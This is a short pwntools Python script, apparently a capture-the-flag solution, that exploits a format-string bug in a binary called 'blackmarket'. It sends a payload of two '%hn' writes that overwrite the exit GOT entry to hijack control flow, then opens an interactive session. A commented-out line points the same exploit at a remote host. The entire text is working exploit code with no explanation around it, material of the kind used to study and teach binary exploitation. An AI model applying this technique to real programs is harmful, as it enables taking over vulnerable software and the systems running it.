from pwn import *
#r = remote('103.200.7.150',5677)
r = process('../blackmarket')
exit_got = 0x0804b038
#exit_got = 0x0804b010 #printf_got
#not_used = 0804 8846


p = ''
p += p32(exit_got) + p32(exit_got + 2)
#p += "%8838x%1$hn"
#p += "%1958x%2$hn"
p += "%34878x%7$hn"
p += "%32702x%8$hn"

#p += fmtstr_payload(7,{exit_got:not_used})

r.sendline('6')
r.sendline(p)
r.clean()
r.interactive()
